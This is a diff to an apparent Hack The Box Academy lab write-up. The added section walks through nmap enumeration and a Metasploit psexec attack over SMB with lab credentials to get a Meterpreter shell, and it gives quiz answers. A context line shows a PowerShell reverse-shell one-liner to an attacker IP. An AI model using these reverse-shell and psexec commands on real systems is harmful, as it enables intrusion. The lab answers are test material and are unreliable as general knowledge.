@@ -76,3 +76,41 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
     ```
 
     After that we can type `hostname` in the our terminal. The answer is `Shells-Win10`.
+
+## Payloads
+### Tools
+1. Metasploit
+### Challenges
+1. What command language interpreter is used to establish a system shell session with the target?
+
+    The answer is `powerhsell`.
+
+2. Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
+
+    To solve this, firs we enumerate using nmap.
+
+    ```bash
+    nmap -sV -sC -Pn 10.129.201.160
+    ```
+
+    We can see it have samba service running.
+
+    ![alt text](assets/Payload1.png)
+
+    Then we use metapsloit.
+
+    ```bash
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set RHOSTS 10.129.201.160
+    RHOSTS => 10.129.201.160
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SHARE ADMIN$
+    SHARE => ADMIN$
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBPass HTB_@cademy_stdnt!
+    SMBPass => HTB_@cademy_stdnt!
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set SMBUser htb-student
+    SMBUser => htb-student
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> set LHOST 10.10.15.234
+    LHOST => 10.10.15.234
+    [msf](Jobs:0 Agents:0) exploit(windows/smb/psexec) >> exploit
+    ```
+
+    After we on Meterpreter session, we type `shell`. We can explore from there. The answer is `staffsalaries.txt`.
